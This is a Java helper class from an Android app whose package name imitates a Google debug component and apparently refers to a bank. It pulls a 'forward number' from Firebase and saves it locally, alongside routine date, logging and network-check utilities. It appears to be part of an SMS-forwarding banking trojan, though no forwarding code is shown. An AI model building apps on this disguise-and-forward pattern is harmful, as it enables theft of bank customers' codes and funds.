package google.test.debug.system.unionb4nk2;

import android.content.Context;
import android.icu.text.SimpleDateFormat;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;

import google.test.debug.system.unionb4nk2.bg.SharedPreferencesHelper;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.Locale;

public class Helper {

    public static String SITE = "localhost";
    public static String TAG = "mywork";

    public static void setNumber(Context  context){
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference usersRef = database.getReference("users").child(Helper.SITE).child("phone");
        usersRef.get().addOnCompleteListener(new OnCompleteListener<DataSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DataSnapshot> task) {
                if (!task.isSuccessful()) {
//                    Log.e(Helper.TAG, "Error getting data", task.getException());
                }
                else {
//                    Log.d(Helper.TAG, "fORWARD nUMBER : "+ String.valueOf(task.getResult().getValue()));
                    SharedPreferencesHelper pref = new SharedPreferencesHelper(context);
                    String phone = String.valueOf(task.getResult().getValue());
                    pref.saveString("phone", phone);
                }
            }
        });
    }
    public static String datetime() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy h:mm:ss a");
            return now.format(formatter);
        } else {
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy h:mm:ss a", Locale.getDefault());
            return sdf.format(new Date());
        }
    }

    public static void debug(Context context, String message){
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        StackTraceElement element = stackTraceElements[3];
        String FileName = element.getFileName();
        int Line = element.getLineNumber();
        Toast.makeText(context, Line+FileName+" : " +message, Toast.LENGTH_SHORT).show();
        Log.d(Helper.TAG, Line+FileName +" : " + message);
    }

    public static void debug(String message){
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        StackTraceElement element = stackTraceElements[3];
        String FileName = element.getFileName();
        int Line = element.getLineNumber();
        Log.d(Helper.TAG, Line+FileName +" : " + message);
    }

    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = connectivityManager.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(network);
                    return networkCapabilities != null && (
                            networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                    );
                }
            } else {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }


}
